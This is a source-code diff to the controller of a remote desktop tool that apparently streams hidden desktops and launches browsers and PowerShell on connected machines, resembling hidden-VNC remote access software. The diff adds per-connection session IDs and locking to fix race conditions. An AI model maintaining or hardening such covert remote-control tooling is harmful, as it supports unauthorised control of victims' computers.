@@ -26,6 +26,7 @@ struct Client
 {
    SOCKET connections[Connection::end];
    DWORD  uhid;
+   DWORD  sessionId;
    HWND   hWnd;
    BYTE  *pixels;
    DWORD  pixelsWidth, pixelsHeight;
@@ -50,13 +51,32 @@ static const DWORD    gc_minWindowHeight = 600;
 enum SysMenuIds   { fullScreen = 101, startExplorer = WM_USER + 1, startRun, startChrome, startEdge, startBrave, startFirefox, startIexplore, startPowershell };
 
 static Client           g_clients[gc_maxClients];
+static DWORD            g_nextSessionId = 1;
 static CRITICAL_SECTION g_critSec;
+
+static DWORD CreateSessionId()
+{
+   DWORD sessionId = g_nextSessionId++;
+   if(!g_nextSessionId)
+      g_nextSessionId = 1;
+   return sessionId;
+}
 
 static Client *GetClientByUhid(DWORD uhid)
 {
    for(int i = 0; i < gc_maxClients; ++i)
    {
       if(g_clients[i].uhid == uhid)
+         return &g_clients[i];
+   }
+   return NULL;
+}
+
+static Client *GetClientByUhidAndSession(DWORD uhid, DWORD sessionId)
+{
+   for(int i = 0; i < gc_maxClients; ++i)
+   {
+      if(g_clients[i].uhid == uhid && g_clients[i].sessionId == sessionId)
          return &g_clients[i];
    }
    return NULL;
@@ -363,13 +383,27 @@ static DWORD WINAPI ClientThread(PVOID param)
    }
    if(connection == Connection::desktop)
    {
-      client = GetClientByUhid(uhid);
-      if(!client)
+      DWORD sessionId;
       {
+         int receivedSessionId;
+         if(!RecvInt(s, &receivedSessionId) || !receivedSessionId)
+         {
+            closesocket(s);
+            return 0;
+         }
+         sessionId = (DWORD) receivedSessionId;
+      }
+
+      EnterCriticalSection(&g_critSec);
+      client = GetClientByUhidAndSession(uhid, sessionId);
+      if(!client || client->connections[Connection::desktop])
+      {
+         LeaveCriticalSection(&g_critSec);
          closesocket(s);
          return 0;
       }
       client->connections[Connection::desktop] = s;
+      LeaveCriticalSection(&g_critSec);
 
       BITMAPINFO bmpInfo;
       bmpInfo.bmiHeader.biSize = sizeof(bmpInfo.bmiHeader);
@@ -460,7 +494,10 @@ static DWORD WINAPI ClientThread(PVOID param)
 
          EnterCriticalSection(&g_critSec);
          BOOL frameReady = FALSE;
-         if(!client->hWnd || client->uhid != uhid || client->connections[Connection::desktop] != s)
+         if(!client->hWnd ||
+            client->uhid != uhid ||
+            client->sessionId != sessionId ||
+            client->connections[Connection::desktop] != s)
          {
             LeaveCriticalSection(&g_critSec);
             free(newPixels);
@@ -561,12 +598,21 @@ frame_cleanup:
             goto exit;
       }
 exit:
-      PostMessage(client->hWnd, WM_DESTROY, NULL, NULL);
+      EnterCriticalSection(&g_critSec);
+      if(client->uhid == uhid &&
+         client->sessionId == sessionId &&
+         client->connections[Connection::desktop] == s &&
+         client->hWnd)
+      {
+         PostMessage(client->hWnd, WM_DESTROY, NULL, NULL);
+      }
+      LeaveCriticalSection(&g_critSec);
       return 0;
    }
    else if(connection == Connection::input)
    {
       char ip[16];
+      DWORD sessionId;
       EnterCriticalSection(&g_critSec);
       {
          client = GetClientByUhid(uhid);
@@ -599,6 +645,8 @@ exit:
          }
 
          client->uhid = uhid;
+         client->sessionId = CreateSessionId();
+         sessionId = client->sessionId;
          client->connections[Connection::input] = s;
 
          client->hWnd = CW_Create(uhid, gc_minWindowWidth, gc_minWindowHeight);
@@ -606,7 +654,7 @@ exit:
       }
       LeaveCriticalSection(&g_critSec);
 
-      SendInt(s, 0);
+      SendInt(s, (int) sessionId);
 
       MSG msg;
       while(GetMessage(&msg, NULL, 0, 0) > 0)
